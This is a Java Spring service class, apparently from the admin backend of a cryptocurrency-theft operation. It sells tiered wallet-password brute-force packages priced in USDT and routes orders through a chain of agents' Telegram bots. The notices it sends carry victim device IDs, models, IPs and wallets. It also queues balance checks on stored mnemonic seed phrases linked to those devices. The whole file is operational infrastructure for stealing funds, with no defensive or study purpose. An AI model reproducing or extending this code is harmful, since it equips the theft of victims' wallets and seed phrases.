package com.admin.service;

import java.util.LinkedHashMap;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.stereotype.Service;

import com.admin.dao.AdminUserDao;
import com.admin.dao.AppidDao;
import com.admin.dao.TgMessageTemplateDao;
import com.admin.entity.AdminUserEntity;
import com.admin.entity.AppidEntity;
import com.admin.entity.DeviceEntity;
import com.admin.entity.TgMessageTemplateEntity;
import com.alibaba.fastjson.JSON;
import com.baomidou.mybatisplus.core.conditions.query.QueryWrapper;

import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;

@Slf4j
@Service
@RequiredArgsConstructor
public class AdminTgService {

    public static final String[] BRUTE_ORDER_PACKAGES = {
            "500U/5天左右出词/适合7位数密码",
            "1000U/8天左右出词/适合8位数密码",
            "3000U/10天左右出词/适合9位数密码",
            "定制/适合大金额/请咨询代理"
    };

    private static final Pattern PLACEHOLDER = Pattern.compile("\\{([a-zA-Z0-9_]+)\\}");

    private final AppidDao appidDao;
    private final AdminUserDao userDao;
    private final TgMessageTemplateDao templateDao;
    private final StringRedisTemplate redis;

    public String[] resolveTg(String appId) {
        String aid = appId == null ? "" : appId.trim().toLowerCase();
        if (aid.isEmpty()) {
            return null;
        }
        AppidEntity app = appidDao.selectOne(new QueryWrapper<AppidEntity>().eq("appid", aid).last("LIMIT 1"));
        if (app == null || app.getUserid() == null) {
            return null;
        }
        Integer uid = app.getUserid();
        for (int g = 0; uid != null && uid > 0 && g < 8; g++) {
            AdminUserEntity user = userDao.selectById(uid);
            if (user == null) {
                break;
            }
            String token = trim(user.getTgRobToken());
            String group = trim(user.getTgGroupid());
            if (!token.isEmpty() && !group.isEmpty()) {
                return new String[] {token, group};
            }
            uid = user.getParentId();
        }
        return null;
    }

    public Map<String, Object> bruteOrder(DeviceEntity device, String wallet, String pkg) {
        Map<String, Object> fail = new LinkedHashMap<>();
        fail.put("ok", false);
        if (device == null) {
            fail.put("error", "设备不存在");
            return fail;
        }
        String pack = pkg == null ? "" : pkg.trim();
        boolean allowed = false;
        for (String p : BRUTE_ORDER_PACKAGES) {
            if (p.equals(pack)) {
                allowed = true;
                break;
            }
        }
        if (!allowed) {
            fail.put("error", "请选择有效套餐");
            return fail;
        }
        String[] creds = resolveTg(device.getAppId());
        if (creds == null) {
            fail.put("error", "未配置飞机机器人/群，无法下单通知");
            return fail;
        }
        TgMessageTemplateEntity tpl = templateDao.selectOne(new QueryWrapper<TgMessageTemplateEntity>()
                .eq("code", "brute_order").eq("status", 1).last("LIMIT 1"));
        String body = tpl == null || tpl.getBody() == null || tpl.getBody().isBlank()
                ? "设备 {device_id} 申请爆破 {wallet} 套餐 {package}"
                : tpl.getBody();
        Map<String, String> vars = new LinkedHashMap<>();
        vars.put("device_id", device.getDeviceId());
        vars.put("wallet", wallet == null || wallet.isBlank() ? "—" : wallet.trim());
        vars.put("package", pack);
        vars.put("group_id", creds[1]);
        vars.put("app_name", device.getAppName() == null ? "—" : device.getAppName());
        vars.put("model", device.getModel() == null ? "—" : device.getModel());
        vars.put("ip", device.getIp() == null ? "—" : device.getIp());
        String text = render(body, vars);
        Map<String, Object> payload = new LinkedHashMap<>();
        payload.put("robot_id", creds[0]);
        payload.put("group_id", creds[1]);
        payload.put("text", text);
        Map<String, Object> meta = new LinkedHashMap<>();
        meta.put("template", "brute_order");
        meta.put("device_id", device.getDeviceId());
        payload.put("meta", meta);
        try {
            redis.opsForList().rightPush("queue:tg_message", JSON.toJSONString(payload));
        } catch (Exception e) {
            fail.put("error", "消息入队失败（Redis 异常）");
            return fail;
        }
        Map<String, Object> ok = new LinkedHashMap<>();
        ok.put("ok", true);
        ok.put("group_id", creds[1]);
        ok.put("package", pack);
        ok.put("wallet", vars.get("wallet"));
        return ok;
    }

    public boolean enqueueMnemonicBalance(long mnemonicId, String deviceId) {
        if (mnemonicId <= 0) {
            return false;
        }
        Map<String, Object> payload = new LinkedHashMap<>();
        payload.put("mnemonic_id", mnemonicId);
        payload.put("device_id", deviceId == null ? "" : deviceId);
        try {
            redis.opsForList().rightPush("queue:mnemonic_balance", JSON.toJSONString(payload));
            return true;
        } catch (Exception e) {
            log.warn("enqueue mnemonic_balance fail: {}", e.toString());
            return false;
        }
    }

    private static String render(String body, Map<String, String> vars) {
        Matcher m = PLACEHOLDER.matcher(body == null ? "" : body);
        StringBuffer sb = new StringBuffer();
        while (m.find()) {
            String val = vars.getOrDefault(m.group(1), m.group(0));
            m.appendReplacement(sb, Matcher.quoteReplacement(val == null ? "" : val));
        }
        m.appendTail(sb);
        return sb.toString();
    }

    private static String trim(String s) {
        return s == null ? "" : s.trim();
    }
}
